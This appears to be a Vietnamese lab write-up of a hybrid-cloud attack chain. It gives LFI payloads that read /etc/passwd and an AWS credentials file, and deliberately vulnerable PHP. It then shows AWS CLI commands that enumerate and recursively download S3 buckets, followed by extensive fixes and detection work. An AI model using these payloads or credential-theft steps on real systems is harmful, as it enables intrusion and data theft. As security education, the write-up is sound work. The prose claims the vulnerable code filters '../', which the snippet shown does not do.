# 🌉 The Leaky Bridge — Project Write-up

> **Disclaimer:** Toàn bộ dự án này được thực hiện trong môi trường lab cô lập hoàn toàn, chỉ phục vụ mục đích học tập và nghiên cứu bảo mật. Mọi thông tin đăng nhập, địa chỉ IP và dữ liệu đều là giả lập.

---

## 1. Tóm tắt (Executive Summary)

Dự án này mô phỏng lại một kịch bản tấn công có thật trong thực tế: một công ty đang trong quá trình chuyển đổi số vô tình để lộ **khóa truy cập AWS** (tương tự như mật khẩu tài khoản đám mây) bên trong một file cấu hình trên máy chủ web nội bộ.

Máy chủ đó lại đang chạy một ứng dụng web có lỗ hổng bảo mật — cho phép kẻ tấn công **đọc bất kỳ file nào trên hệ thống** chỉ bằng một đường link HTTP đơn giản. Từ đó, kẻ tấn công leo thang thành công vào hệ thống đám mây AWS và tải xuống toàn bộ dữ liệu nhạy cảm — bao gồm thông tin cá nhân khách hàng và báo cáo tài chính nội bộ — trong vòng chưa đầy 5 phút.

**Bài học cốt lõi:** Một lỗ hổng nhỏ ở hệ thống on-premise (máy chủ nội bộ) có thể trở thành cửa hậu dẫn vào toàn bộ hạ tầng đám mây. Đây chính là điểm yếu nguy hiểm nhất của các môi trường hybrid cloud — nơi hai thế giới on-premise và cloud kết nối với nhau.

---

## 2. Bối cảnh & Môi trường Lab

### Kịch bản

Hãy tưởng tượng một công ty có:
- Một website nội bộ chạy trên máy chủ vật lý (on-premise)
- Hệ thống lưu trữ file trên AWS S3 (đám mây của Amazon)
- Một script tự động backup dữ liệu từ máy chủ lên S3 mỗi 5 phút

Trong quá trình cài đặt, kỹ sư hệ thống đã lưu thông tin đăng nhập AWS (Access Key) trực tiếp vào file cấu hình trên máy chủ — một thói quen xấu nhưng rất phổ biến.

### Sơ đồ tấn công

```
[Kẻ tấn công]
    |
    | Bước 1: Quét và phát hiện website
    ↓
[Máy chủ web - 192.168.56.101]
    |  Lỗ hổng LFI: đọc file tùy ý
    |
    | Bước 2: Đọc file chứa AWS credentials
    ↓
[File /home/ubuntu/.aws/credentials]
    |  Lấy được Access Key ID + Secret Key
    |
    | Bước 3: Dùng credentials đăng nhập AWS
    ↓
[AWS Cloud - S3 Bucket]
    |
    | Bước 4: Tải xuống toàn bộ dữ liệu nhạy cảm
    ↓
[Dữ liệu bị đánh cắp: thông tin khách hàng, báo cáo tài chính]
```

### Công cụ sử dụng

| Công cụ | Mục đích | Ai dùng cái này ngoài thực tế |
|---|---|---|
| **Nmap** | Quét cổng, phát hiện dịch vụ đang chạy | Hacker, pentester, sysadmin |
| **Python + requests** | Tự động hóa khai thác lỗ hổng LFI | Pentester |
| **AWS CLI / boto3** | Tương tác với AWS bằng credentials bị đánh cắp | DevOps, attacker |
| **scikit-learn** | Xây dựng mô hình ML phát hiện bất thường | Security analyst, data scientist |
| **Terraform** | Dựng hạ tầng AWS bằng code | DevOps, Cloud engineer |

---

## 3. Bước 1 — Trinh sát (Reconnaissance)

### Kẻ tấn công làm gì?

Trước khi tấn công bất cứ thứ gì, kẻ tấn công cần biết "mặt trận" trông như thế nào: máy chủ đang mở những cổng nào? Đang chạy phần mềm gì?

Điều này giống như một tên trộm đi vòng quanh tòa nhà, kiểm tra xem cửa nào đang mở, cửa sổ nào chưa khóa.

### Công cụ: Nmap

```bash
nmap -sV -sC -O -T4 192.168.56.101
```

### Kết quả phát hiện

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.52 (PHP)
```

Hai cổng đang mở:
- **Cổng 22 (SSH):** Cổng đăng nhập từ xa vào máy chủ — có thể dùng nếu tìm được mật khẩu
- **Cổng 80 (HTTP):** Đang chạy một website — đây là mục tiêu chính

**Phát hiện quan trọng:** Website đang dùng PHP — một ngôn ngữ lập trình phổ biến nhưng dễ mắc lỗi bảo mật nếu code không cẩn thận.

---

## 4. Bước 2 — Phát hiện & Khai thác lỗ hổng LFI

### LFI là gì? (Giải thích cho người không kỹ thuật)

**LFI (Local File Inclusion)** — Lỗ hổng "Đọc File Nội Bộ."

Hãy tưởng tượng bạn vào thư viện, nhân viên hỏi: "Bạn muốn đọc sách gì?" Bạn trả lời: "Quyển số 5." Họ lấy quyển số 5 cho bạn.

Nhưng nếu bạn nói: "Cho tôi đọc hồ sơ nhân viên trong két sắt," và nhân viên ngây thơ đi lấy ra — đó chính là lỗ hổng LFI.

### Code lỗi trông như thế nào?

**Đoạn code PHP có lỗ hổng (trong `vulnerable-app/index.php`):**

```php
// ❌ Nguy hiểm: nhận input từ người dùng mà không kiểm tra
$filename  = $_GET['file'];
$full_path = '/var/www/html/docs/' . $filename;
echo file_get_contents($full_path);  // Đọc bất kỳ file nào!
```

Vấn đề: lập trình viên chỉ kiểm tra xem filename có chứa `../` không (một dạng thoát thư mục cơ bản), nhưng quên mất rằng kẻ tấn công có thể dùng **đường dẫn tuyệt đối** để bypass hoàn toàn.

### Khai thác như thế nào?

Kẻ tấn công thử gửi các request sau:

| Payload thử | Kết quả |
|---|---|
| `?file=../../../etc/passwd` | ❌ Bị chặn (filter phát hiện `../`) |
| `?file=/etc/passwd` | ✅ **BYPASS! Đọc được file** |
| `?file=/home/ubuntu/.aws/credentials` | ✅ **JACKPOT — lấy được AWS key!** |

**Chỉ với một URL đơn giản:**
```
http://192.168.56.101/?file=/home/ubuntu/.aws/credentials
```

**Kết quả trả về:**
```ini
[default]
aws_access_key_id     = AKIASIMULATEDKEY0001
aws_secret_access_key = SimulatedSecretKey/ABCDEFGHIJ...
region                = ap-southeast-1
```

Đây chính là "chìa khóa" để vào toàn bộ tài khoản AWS của công ty.

---

## 5. Bước 3 — Xoay trục vào Cloud (Cloud Pivot)

### AWS Access Key là gì?

Tương tự như username + password để đăng nhập vào AWS, nhưng dành cho máy tính tự động dùng — không cần giao diện đồ họa.

Khi kẻ tấn công có **Access Key ID** + **Secret Access Key**, họ có thể làm mọi thứ mà tài khoản đó được phép làm.

### Kẻ tấn công xác nhận danh tính

```bash
aws sts get-caller-identity --profile stolen
```

```json
{
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/svc-backup-agent"
}
```

**Họ đang là user `svc-backup-agent`** — tài khoản dùng để backup, nhưng có quyền truy cập rộng hơn mức cần thiết rất nhiều.

### Liệt kê toàn bộ S3 bucket

```bash
aws s3 ls --profile stolen
```

```
2024-08-15  corp-sensitive-docs-prod-lab
2024-08-15  corp-hr-archive-2023
2024-08-15  corp-audit-logs-private
2024-08-15  corp-backup-raw-2024
```

**Vấn đề:** Tài khoản backup chỉ cần truy cập 1 bucket cụ thể, nhưng lại được cấp quyền đọc **tất cả** 4 bucket trong toàn bộ account. Đây là vi phạm nguyên tắc "Least Privilege" (tối thiểu hóa quyền hạn).

---

## 6. Bước 4 — Exfiltration (Đánh cắp dữ liệu)

### Tải xuống toàn bộ dữ liệu nhạy cảm

```bash
aws s3 cp s3://corp-sensitive-docs-prod-lab/ ./stolen-data/ --recursive --profile stolen
```

**Kết quả trong vòng chưa đầy 60 giây:**

```
download: customer_data.csv       → stolen-data/customer_data.csv
download: financial_report_2024.csv → stolen-data/financial_report_2024.csv
```

### Dữ liệu bị đánh cắp

**File 1: `customer_data.csv`** — Thông tin cá nhân 10 khách hàng:

| Thông tin | Mức độ nhạy cảm |
|---|---|
| Họ tên, email, số điện thoại | Cao |
| Số thẻ tín dụng | **Rất cao — vi phạm PCI-DSS** |
| Số dư tài khoản | Cao |

**File 2: `financial_report_2024.csv`** — Báo cáo tài chính nội bộ Q1–Q4 2024, bao gồm doanh thu, chi phí và lợi nhuận của từng phòng ban — dữ liệu **chưa công bố ra bên ngoài**.

### Thiệt hại thực tế (nếu đây không phải lab)

- **Vi phạm PDPA/GDPR** — rò rỉ thông tin cá nhân khách hàng → phạt tiền, kiện tụng
- **Vi phạm PCI-DSS** — lộ số thẻ tín dụng → đình chỉ khả năng nhận thanh toán
- **Rò rỉ thông tin tài chính** → bất lợi cạnh tranh, mất lòng tin nhà đầu tư
- **Key chưa bị thu hồi** → kẻ tấn công có thể quay lại bất cứ lúc nào

---

## 7. Phòng thủ (Defense)

### Fix 1 — Vá lỗ hổng LFI trong PHP

**Giải pháp (`defense/fixed_index.php`):** Thay vì chấp nhận bất kỳ tên file nào từ người dùng, chỉ cho phép một danh sách file đã được phê duyệt sẵn:

```php
// ✅ Allowlist: chỉ cho phép đúng 4 file này
const ALLOWED_FILES = ['welcome.txt', 'network-map.txt', 'server-info.txt', 'maintenance.txt'];

if (!in_array($_GET['file'], ALLOWED_FILES, true)) {
    die("Access denied.");  // Từ chối tất cả thứ khác
}

// ✅ realpath() giải quyết mọi trick encoding/traversal còn lại
$full_path = realpath($base_dir . '/' . $_GET['file']);

// ✅ Kiểm tra file có nằm trong thư mục được phép không
if (strpos($full_path, $base_dir) !== 0) {
    die("Access denied.");
}
```

**Hiệu quả:** Dù attacker thử payload nào, kết quả đều là `Access denied` — vì không có payload nào khớp với danh sách cho phép.

### Fix 2 — Xóa Static Credentials, dùng IAM Role

**Nguyên nhân gốc rễ:** Không bao giờ lưu AWS key vào file trên máy chủ.

**Giải pháp đúng:** Sử dụng **IAM Role cho EC2** — thay vì lưu key cứng, máy chủ tự động nhận quyền truy cập thông qua metadata của AWS. Không có key nào trên disk → không có gì để đánh cắp.

```bash
# Gắn IAM Role cho máy chủ EC2
aws ec2 associate-iam-instance-profile \
    --instance-id i-0abc123def456 \
    --iam-instance-profile Name=WebServerBackupRole
```

### Fix 3 — Giảm quyền theo nguyên tắc Least Privilege

**Trước (nguy hiểm):** `svc-backup-agent` có quyền đọc mọi thứ trong mọi bucket.

**Sau (an toàn):** Chỉ được đọc file trong thư mục `backups/` của đúng 1 bucket duy nhất.

| Quyền | Trước | Sau |
|---|---|---|
| Liệt kê tất cả bucket | ✅ Được | ❌ Bị xóa |
| Đọc `customer_data.csv` | ✅ Được | ❌ Không thể |
| Đọc bucket của HR, audit | ✅ Được | ❌ Không thể |
| Sync file backup | ✅ Được | ✅ Vẫn được |

### Fix 4 — Giám sát với CloudTrail + Cảnh báo tự động

**Vấn đề:** Cuộc tấn công đã xảy ra hoàn toàn mà không có cảnh báo nào.

**Giải pháp (`defense/cloudtrail_detector.py`):** Viết script phát hiện hành vi bất thường trong log AWS:

| Quy tắc | Điều kiện kích hoạt | Mức độ |
|---|---|---|
| `ENUM-001` | `svc-backup-agent` gọi ListBuckets | 🔴 Cao |
| `EXFIL-001` | >10 lần GetObject trong 1 giờ | 🔴 Nghiêm trọng |
| `GEO-001` | API call từ IP lạ | 🟠 Cao |
| `TEMPORAL-001` | Truy cập S3 ngoài giờ hành chính | 🟡 Trung bình |

---

## 8. Ứng dụng Machine Learning vào bảo mật

### Giới hạn của rule-based detection

Các quy tắc cứng (như trên) có điểm yếu: nếu kẻ tấn công biết ngưỡng cảnh báo là 10 file/giờ, họ chỉ cần download 9 file/giờ để không bị phát hiện.

### Tiếp cận bằng ML: Isolation Forest

**Ý tưởng:** Thay vì viết quy tắc cứng, huấn luyện mô hình ML học "hành vi bình thường" của `svc-backup-agent` trong 6 tháng. Bất kỳ session nào khác biệt có sẽ bị gắn cờ là bất thường — dù không vi phạm quy tắc nào.

**Các đặc trưng (features) trích xuất từ CloudTrail log:**

| Feature | Baseline bình thường | Khi bị tấn công |
|---|---|---|
| Giờ trong ngày | 23:00 (cron job) | 14:00 (giữa giờ làm việc) |
| Số lần gọi ListBuckets | **0** (không bao giờ) | **5** (đang liệt kê) |
| Tổng bytes tải xuống | ~5 MB | ~85 MB |
| Số file truy cập | ~80 | ~450 |
| IP có trong whitelist | ✅ Có | ❌ Không |

**Kết quả scoring của mô hình:**

```
Backup cron bình thường    → Score: +0.12  ✅ NORMAL
Attacker enumeration       → Score: -0.45  🔴 ANOMALY
Attacker mass exfiltration → Score: -0.89  🔴 ANOMALY
```

Score âm càng lớn = càng bất thường. Cuộc tấn công exfiltration có score **-0.89** trong khi baseline bình thường là **+0.12** — cách biệt 7 lần, đủ để tự động thu hồi key qua IAM API.

**Pipeline production (kế hoạch mở rộng):**
```
CloudTrail → Kinesis Data Streams → Lambda
    → SageMaker (Isolation Forest) → Score < -0.3?
    → SNS Alert + Tự động thu hồi key qua IAM API
```

---

## 9. Phân tích tác động (Impact Analysis)

### Chuỗi tấn công hoàn chỉnh

```
Lỗi nhỏ: developer để lại credentials trong file
    ↓ (chỉ cần 1 request HTTP)
Đọc được /home/ubuntu/.aws/credentials qua LFI
    ↓ (chỉ mất vài giây)
Xác thực với AWS bằng credentials bị đánh cắp
    ↓ (chỉ mất vài giây)
Liệt kê và tải xuống toàn bộ dữ liệu nhạy cảm
    ↓
Tổng thời gian: < 5 phút
```

### 5 nguyên nhân gốc rễ

1. **LFI trong PHP** — không validate input đúng cách
2. **Static AWS credentials trên disk** — không dùng IAM Role
3. **IAM policy quá rộng** — `Resource: "*"` thay vì chỉ 1 bucket
4. **Không có monitoring** — CloudTrail chưa cấu hình alert
5. **Không có secret scanning** — không phát hiện key bị commit lên git

---

## 10. Bài học rút ra (Lessons Learned)

**Về bảo mật hệ thống:**
- Ranh giới giữa on-premise và cloud là điểm yếu nguy hiểm nhất trong hybrid environment
- Một lỗ hổng nhỏ ở lớp ứng dụng có thể dẫn đến vi phạm toàn bộ hạ tầng cloud
- Least Privilege không phải khuyến nghị — đó là bắt buộc

**Về quy trình phát triển:**
- Secret scanning (gitleaks) nên là bước bắt buộc trong CI/CD pipeline
- IAM Role luôn ưu tiên hơn static credentials — không có ngoại lệ
- `realpath()` + allowlist là cặp đôi bắt buộc khi xử lý file path do người dùng nhập

**Về phòng thủ:**
- Detection mà không có response thì vô nghĩa — cần tự động hóa từ alert đến hành động
- ML không thay thế rule-based detection, mà bổ sung cho nó — bắt những gì rule bỏ sót

---

## 11. Tài liệu tham khảo

- [OWASP: Path Traversal / LFI](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22: Improper Limitation of a Pathname](https://cwe.mitre.org/data/definitions/22.html)
- [AWS IAM Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)
- [MITRE ATT&CK T1537: Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1537/)
- [scikit-learn: Isolation Forest](https://scikit-learn.org/stable/modules/generated/sklearn.ensemble.IsolationForest.html)

---

*Write-up by ttienpham | Cybersecurity & Cloud Security Research | 2026*
